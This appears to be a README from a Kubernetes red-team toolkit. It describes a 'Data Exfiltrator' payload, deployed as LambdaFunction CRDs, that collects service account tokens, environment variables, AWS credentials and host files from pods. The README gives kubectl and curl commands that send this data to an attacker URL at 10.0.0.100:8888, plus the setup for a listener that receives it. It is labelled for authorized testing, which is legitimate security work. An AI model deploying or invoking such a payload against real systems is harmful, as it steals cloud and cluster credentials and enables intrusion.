# Payload: Data Exfiltrator

⚠️ **AUTHORIZED TESTING ONLY**

## Description

LambdaFunction CRDs that collect and exfiltrate sensitive data from Lambda pods.

## Variants

| Name | Description | Severity |
|------|-------------|----------|
| `payload-exfiltrator-full` | Full exfiltration (K8s, env, AWS, system, network) | CRITICAL |
| `payload-exfiltrator-k8s-only` | K8s SA token only | HIGH |
| `payload-exfiltrator-env-only` | Environment variables only | MEDIUM |

## Usage

```bash
# Deploy
kubectl apply -f exfiltrator.yaml -n redteam-test

# Invoke full exfiltration
curl -X POST http://payload-exfiltrator-full.redteam-test.svc.cluster.local \
  -H "Content-Type: application/json" \
  -d '{"attacker_url": "http://10.0.0.100:8888"}'

# Selective exfiltration
curl -X POST http://payload-exfiltrator-full.redteam-test.svc.cluster.local \
  -H "Content-Type: application/json" \
  -d '{"attacker_url": "http://10.0.0.100:8888", "collect": ["k8s", "env"]}'
```

## Event Payload

```json
{
  "attacker_url": "http://10.0.0.100:8888",
  "collect": ["k8s", "env", "system", "network", "aws"]
}
```

## Data Collected

- **k8s**: Service account token, namespace, CA cert
- **env**: All environment variables
- **system**: Hostname, user, UID/GID, working directory
- **network**: /etc/hosts, /etc/resolv.conf
- **aws**: AWS credentials from env vars and ~/.aws/credentials

## Attacker Setup

```bash
# Start HTTP server to receive data
python3 -m http.server 8888

# Or use the attacker-server.py script
python3 ../scripts/attacker-server.py --port 8888
```
